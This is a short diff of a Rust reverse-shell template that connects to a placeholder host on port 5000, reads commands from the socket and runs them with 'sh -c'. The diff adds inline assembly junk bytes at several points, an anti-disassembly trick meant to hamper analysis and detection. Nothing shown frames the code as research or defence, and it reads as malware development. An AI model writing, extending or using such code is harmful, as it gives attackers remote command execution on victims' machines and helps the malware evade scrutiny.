@@ -27,10 +27,22 @@ use std::net::TcpStream;
 use std::process::Command;
 
 pub fn main() {{
+    unsafe {{
+        std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+    }}
     if let Ok(mut stream) = TcpStream::connect(\"{}:5000\") {{
+        unsafe {{
+            std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+        }}
         loop {{
+            unsafe {{
+                std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+            }}
             let mut buffer = [0; 1024];
             if let Ok(n) = stream.read(&mut buffer) {{
+                unsafe {{
+                    std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+                }}
                 let cmd = String::from_utf8_lossy(&buffer[..n]);
                 let output = Command::new(\"sh\")
                     .arg(\"-c\")
